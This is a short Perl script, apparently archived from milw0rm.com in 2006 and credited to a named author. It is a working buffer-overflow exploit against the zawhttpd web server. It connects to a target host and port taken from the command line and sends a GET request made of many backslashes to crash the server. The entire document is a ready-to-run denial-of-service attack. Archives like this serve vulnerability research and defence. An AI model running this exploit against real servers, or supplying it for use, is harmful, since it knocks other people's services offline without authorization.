#!/usr/bin/perl
# zawhttpd Buffer Overflow Exploit
# by Kamil 'K3' Sienicki

use IO::Socket;
use strict;

my($socket) = "";

if($socket = IO::Socket::INET->new(
                PeerAddr => $ARGV[0],
                PeerPort => $ARGV[1],
                Proto => "TCP"))
{
        print "Attempting to kill zawhttpd at $ARGV[0]:$ARGV[1] ...";
        print $socket "GET \\\\\\\\\\\\\\\\\\\\ HTTP/1.0\r\n\r\n";
        close($socket);
}
else
{
        print "perl zawhttpd.pl localhost 80 \n";
        print "Cannot connect to $ARGV[0]:$ARGV[1]\n";
}
#EoF 

# milw0rm.com [2006-05-04]